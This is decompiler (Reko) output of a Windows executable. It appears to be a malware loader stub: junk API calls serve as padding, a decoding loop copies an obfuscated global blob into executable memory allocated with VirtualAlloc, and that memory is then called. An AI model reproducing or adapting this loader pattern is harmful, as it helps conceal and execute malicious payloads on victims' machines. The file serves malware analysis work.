// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401278: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	GetCPInfo(ecx & 0x00, fp - 0x0100);
	GetCurrentProcessId();
	GetCurrentThreadId();
	RegEnumKeyExA(fp - 0x5C, 0x12, 0x00, fp - 0x60, fp - 0x8C, fp - 116, fp - 0xCC, (struct _FILETIME *) 0x02);
	OpenMutexA(0x15, 0x00, fp - 0x70);
	RegEnumValueW(fp - 0xA8, 0x08, (WCHAR *) 0x17, fp - 0xC0, fp - 0xA4, fp - 0xA4, fp - 0x7C, 0x00);
	Eq_16 edx_109 = fp - 0xC0 & 0x00;
	OpenEventA(edx_109 & 0x0D, edx_109, fp - 0x80);
	Eq_16 eax_130 = InitializeAcl(fp - 0x5C, 0x13, 0x12);
	Eq_108 ecx_134 = fp - 0xA4 - dwLoc0104;
	if (ecx_134 != 0x0386)
		ecx_134 = ecx_134 + eax_130 + (ecx_134 <u 0x0386) | 12277;
	malloc(0x00);
	(ecx_134 & dwLoc01B0 & GetOEMCP()) != 0x0324;
	Eq_2 ecx_195 = fp - 88 & 0x00;
	Eq_48 eax_202 = RegEnumKeyExA(fp - 0x7C, ecx_195, 0x00, fp - 88, fp - 0xA8, fp - 0xAC, fp - 0xAC, (struct _FILETIME *) 0x14);
	if ((ecx_195 & eax_202 | fp - 0xAC) != 0x87)
		eax_202 = fp - 0x04;
	__set_app_type(0x02);
	OpenMutexA(((eax_202 ^ dwArg02) + 0x0861 | 0x3FC7) & 0x00, 0x00, fp - 0xC0);
	GetCPInfo(RegOpenKeyA(fp - 0x78, fp - 212, fp - 0x84) & 0x00, fp - 0xD8);
	RegEnumKeyA(fp - 0xC4, 0x0A, fp - 0x68, 0x00);
	GetOEMCP();
	RegEnumKeyA(fp - 0xF0, 0x00, fp - 0x78, 0x0A);
	Eq_225 ecx_313 = fp - 0x0288;
	if (OpenMutexA(0x0A, 0x00, fp - 0x90) == null)
		ecx_313 = (fp - 15441 | dwLoc94) ^ 0x1662;
	RegOpenKeyA(fp - 0xEC, fp - 188, fp - 200);
	if (ecx_313 != 0x00)
		ecx_313 = fp - 0x04;
	GetLastError();
	Eq_255 eax_381 = CreateItemMoniker(null, null, null);
	ui32 ecx_377 = ecx_313 | 0x306C;
	Eq_2 eax_383 = eax_381 ^ 0x80070057;
	if ((eax_381 ^ 0x80070057) == 0x00)
	{
		Eq_279 eax_522 = VirtualAlloc(0x00, 0x3000, 0x1000, 0x40);
		struct Eq_291 * edx_538 = &globals->t40A55C;
		Eq_279 esi_550 = eax_522;
		word32 dwLoc0230_556 = 1839877483;
		Eq_296 ecx_559 = ((fp - 0x04 | dwLoc01CC) ^ dwLoc01CD) - (fp - 0x01D4) + dwLoc023B;
		if ((fp - 0x023C | 0x34FC) == dwLoc024C)
			ecx_559 = fp - 400 ^ 0x030E;
		do
		{
			word32 edi_584 = edx_538->dw0000 + dwLoc0230_556;
			*esi_550 = edi_584;
			dwLoc0230_556 = dwLoc0230_556 + 3713120415;
			ptr32 edx_595 = (char *) edx_538 - 810971396;
			word32 ebx_598 = fp - 0xB0 + ecx_559 + (edx_595 <u 0x00);
			Eq_340 eax_599 = fp - 0x04;
			ui32 ecx_605 = (ecx_559 | dwArg0C) + dwArg0C ^ dwLoc02;
			word32 esi_606 = esi_550 + 1332391190;
			edx_538 = edx_595 + 810971400;
			if (ebx_598 == 0x0245)
				eax_599 = (word32) fp + 0x000020B0 & 0x06A9;
			esi_550 = esi_606 + 0xB09552EE;
			ecx_559 = ecx_605 + 0x0EA7 ^ 0x2367;
		} while (edx_595 != 806730588);
		word32 esp_639;
		word32 ebp_640;
		byte SCZO_641;
		word32 edx_642;
		bool Z_643;
		byte SZO_645;
		Eq_375 C_646;
		word32 ecx_647;
		word32 ebx_648;
		word32 esi_649;
		word32 edi_650;
		eax_522();
		if (ebx_648 == ((word32) C_646 + (ecx_647 + ebx_648)) - ebx_648)
			eax_383 = eax_383 | dwLocAC;
	}
	return eax_383;
}

